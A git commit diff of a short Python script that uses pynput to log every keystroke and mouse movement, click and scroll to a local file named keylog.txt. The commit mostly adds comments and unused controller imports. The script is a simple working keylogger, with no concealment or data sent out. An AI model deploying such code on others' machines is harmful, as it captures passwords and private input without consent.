cafd49103ceb2df35a689805d4d0aa8d75f3ff0d
Daniel Trofimovs <danilstrofimovs@gmail.com>
2024-07-11 15:44:44 +0200

    Update main.py for logging virtual keyboards

--- main.py
+++ main.py
@@ -1,20 +1,20 @@
-from pynput.keyboard import Key, Listener
-from pynput.mouse import Listener as MouseListener
+from pynput.keyboard import Key, Listener, Controller as KeyboardController
+from pynput.mouse import Listener as MouseListener, Controller as MouseController
 import logging
 
-#Logging parameters
+# logging parameters
 log_file = "keylog.txt"
 logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s: %(message)s')
 
-#keyboard logging
+# Keyboard logging function
 def on_press(key):
     logging.info(f"Keyboard key pressed: {key}")
 
 def on_release(key):
     if key == Key.esc:
         return False
-    
-#mouse logging
+
+# Mouse logging function
 def on_move(x, y):
     logging.info(f"Mouse moved to ({x}, {y})")
 
@@ -25,12 +25,16 @@ def on_click(x, y, button, pressed):
 def on_scroll(x, y, dx, dy):
     logging.info(f"Mouse scrolled at ({x}, {y})({dx}, {dy})")
 
+# Set up keyboard listener
 keyboard_listener = Listener(on_press=on_press, on_release=on_release)
 
+# Set up mouse listener
 mouse_listener = MouseListener(on_move=on_move, on_click=on_click, on_scroll=on_scroll)
 
+# Start listeners
 keyboard_listener.start()
 mouse_listener.start()
 
+# Join listeners to the main thread
 keyboard_listener.join()
 mouse_listener.join()
